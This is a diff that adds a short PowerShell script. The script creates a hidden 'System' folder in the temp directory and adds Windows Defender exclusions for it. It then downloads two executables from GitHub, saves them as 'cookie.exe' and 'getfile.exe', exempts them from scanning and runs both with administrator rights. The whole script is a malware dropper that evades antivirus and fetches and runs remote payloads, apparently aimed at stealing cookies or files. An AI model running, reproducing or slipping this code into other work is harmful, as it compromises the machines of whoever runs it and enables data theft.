@@ -1,0 +1,22 @@
+$systemPath = [System.IO.Path]::Combine($env:temp, "System")
+New-Item -Path $systemPath -ItemType Directory -Force
+
+
+Add-MpPreference -ExclusionPath $systemPath
+
+$cookieUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/XClient.exe"
+$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
+
+Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
+
+Add-MpPreference -ExclusionProcess $cookiePath
+
+$getfileUrl = "https://github.com/PXTDEV9022/ccc/raw/refs/heads/main/XClient.exe"
+$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
+
+Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
+
+
+Add-MpPreference -ExclusionProcess $getfilePath
+Start-Process -FilePath $cookiePath -Verb RunAs
+Start-Process -FilePath $getfilePath -Verb RunAs
